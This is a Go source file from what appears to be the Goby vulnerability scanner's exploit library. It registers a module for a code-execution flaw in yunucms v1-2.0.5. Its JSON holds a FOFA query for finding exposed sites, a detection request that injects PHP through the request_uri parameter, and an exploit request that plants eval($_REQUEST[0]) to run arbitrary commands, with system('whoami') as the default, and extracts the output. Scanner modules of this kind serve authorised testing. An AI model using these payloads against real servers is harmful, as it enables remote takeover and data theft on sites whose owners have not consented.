package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "yunucms request_uri method code execution vulnerabilities",
    "Description": "<p>yunucms is a free and open source urban substation management system developed by Yunyou Network Technology Co., Ltd. based on the TP5.0 framework.</p><p>There is a code execution vulnerability in the request_uri parameter of the front-end wap/index/index method of the yunucms system v1-2.0.5. Attackers can obtain server permissions through the vulnerability.</p>",
    "Product": "yunucms",
    "Homepage": "http://www.yunucms.com",
    "DisclosureDate": "2022-08-10",
    "Author": "qiushui_sir@163.com",
    "FofaQuery": "body=\"index/css/yunu.css\"",
    "GobyQuery": "body=\"index/css/yunu.css\"",
    "Level": "3",
    "Impact": "<p>There is a code execution vulnerability in the request_uri parameter of the front-end wap/index/index method of the yunucms system v1-2.0.5. Attackers can obtain server permissions through the vulnerability.</p>",
    "Recommendation": "<p>1. The vulnerability has been officially fixed, please upgrade to the latest version</p><p>2. Deploy a web application firewall to monitor sensitive functions.</p><p>3. If it is not necessary, it is forbidden to access the system from the public network.</p>",
    "References": [
        "https://www.qshu1.com/2022/09/17/yunucms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/ 代码注入部分"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "code",
            "type": "input",
            "value": "system('whoami');",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/index.php?s=wap/index/index&asdasd=aa\";print_r(md5(123));exit;?>",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "202cb962ac59075b964b07152d234b70",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/index.php?s=wap/index/index&asdasd=aa\";print_r(md5(123));eval($_REQUEST[0]);print_r(md5(123));exit;?>",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "0={{{code}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "202cb962ac59075b964b07152d234b70",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|202cb962ac59075b964b07152d234b70([\\w\\W]+)202cb962ac59075b964b07152d234b70"
            ]
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "10.0",
    "Translation": {
        "CN": {
            "Name": "yunucms 城市分站管理系统 request_uri 参数代码执行漏洞",
            "Product": "yunucms",
            "Description": "<p>yunucms是云优网络科技有限公司基于TP5.0框架为核心开发的免费开源的城市分站管理系统系统。yunucms系统v1-2.0.5版本前台wap/index/index方法的request_uri参数存在代码执行漏洞，攻击者可以通过漏洞获取服务器权限。</p>",
            "Recommendation": "<p>1、官方已修复该漏洞，请用户升级至最新版本</p><p>2、部署Web应用防火墙，对敏感函数进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p><span style=\"font-size: 16px; color: rgb(22, 28, 37);\">yunucms系统v1-2.0.5版本前台wap/index/index</span><span style=\"color: rgb(62, 62, 62); font-size: 16px;\">方法的request_uri参数存在代码执行漏洞，攻击者可以通过漏洞获取服务器权限。</span><br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "yunucms request_uri method code execution vulnerabilities",
            "Product": "yunucms",
            "Description": "<p>yunucms is a free and open source urban substation management system developed by Yunyou Network Technology Co., Ltd. based on the TP5.0 framework.</p><p>There is a code execution vulnerability in the request_uri parameter of the front-end wap/index/index method of the yunucms system v1-2.0.5. Attackers can obtain server permissions through the vulnerability.<br></p>",
            "Recommendation": "<p>1. The vulnerability has been officially fixed, please upgrade to the latest version</p><p>2. Deploy a web application firewall to monitor sensitive functions.</p><p>3. If it is not necessary, it is forbidden to access the system from the public network.</p>",
            "Impact": "<p>There is a code execution vulnerability in the request_uri parameter of the front-end wap/index/index method of the yunucms system v1-2.0.5. Attackers can obtain server permissions through the vulnerability.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10710"
}`



	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}